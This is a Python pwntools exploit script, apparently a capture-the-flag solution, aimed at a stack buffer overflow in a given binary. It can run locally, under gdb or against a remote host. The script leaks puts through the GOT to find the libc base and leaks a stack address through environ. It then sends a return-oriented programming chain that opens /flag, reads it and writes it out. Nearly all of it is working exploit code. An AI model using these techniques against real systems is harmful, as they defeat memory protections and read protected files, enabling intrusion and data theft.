#!/usr/bin/env python3

from argparse import ArgumentParser as ap
from pwn import *

parser = ap()
parser.add_argument("binary")
subparsers = parser.add_subparsers(dest='subcommand')

local_parser = subparsers.add_parser('l')
debug_parser = subparsers.add_parser('d')
remote_parser = subparsers.add_parser('r')
remote_parser.add_argument("ip", type=str)
remote_parser.add_argument("port", type=int)
args = parser.parse_args()

context.binary = elf = ELF(args.binary)
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

if args.subcommand == 'l':
    io = process(context.binary.path)
elif args.subcommand == 'd':
    io = gdb.debug(context.binary.path, gdbscript='continue')
elif args.subcommand == 'r':
    io = remote(args.ip, args.port)
else:
    raise SystemExit

end_banner = b"###\n\n"
io.recvuntil(end_banner)

rop = ROP([elf])
challenge = elf.symbols['challenge']

g = cyclic_gen()

pattern = g.get(0x1000)
#io.send(pattern)
#io.interactive()
log.info(g.find(0x6261616762616166))
offset = g.find(0x6261616762616166)[0]

exploit = offset * b'A'
rop(rdi=elf.got['puts'])
rop.raw(elf.plt['puts'])
rop.raw(challenge)
exploit += rop.chain()
log.info(rop.dump())
io.send(exploit)

io.recvuntil(b"Leaving!\n")
puts_leak = u64(io.recvuntil(b'\n').strip(b'\n').ljust(8, b"\x00"))
log.info(puts_leak)
libc.address = puts_leak - libc.sym["puts"]
log.info(f"Puts: {hex(puts_leak)}")
log.info(f"libc base: {hex(libc.address)}")

log.info("\n\nLOOP 2\n\n")

exploit = offset * b'A'
rop = ROP([elf, libc])
#rop(rdi=(libc.sym['environ']))
#rop.raw(libc.sym['puts'])
rop(rdi=1, rsi=libc.sym['environ'], rdx=8)
rop.raw(libc.sym['write'])
rop.raw(challenge)
log.info(rop.dump())
exploit += rop.chain()
io.send(exploit)

io.recvuntil(b"Leaving!\n")
env_leak = u64(io.recv(8).ljust(8, b"\x00"))
#env_leak = u64(io.recvuntil(b'\n').strip(b'\n').ljust(8, b"\x00"))

log.info(f"Environ: {hex(env_leak)}")

stack_offset = -320

#log.info("\n\nLOOP 3\n\n")
#exploit = b'ABCD' + ((offset - 4) * b'B')
#rop = ROP([elf, libc])
#rop(rdi=1, rsi=env_leak+stack_offset, rdx=-stack_offset)
#rop.raw(libc.sym['write'])
#rop.raw(challenge)
#exploit += rop.chain()
#io.send(exploit)
#io.recvuntil(b"Leaving!\n")
#io.interactive()

log.info("\n\nLOOP 4\n\n")

stack_leak = (env_leak + stack_offset)
rop = ROP([elf, libc], base=stack_leak + offset)

exploit = offset * b'A'
rop.call("open", [b"/flag", os.O_RDONLY])
rop.call("read", [3, stack_leak, 57])
rop.call("write", [1, stack_leak, 57])
rop.call("exit", [0])
log.info(rop.dump())
exploit += rop.chain()
io.send(exploit)
io.interactive()

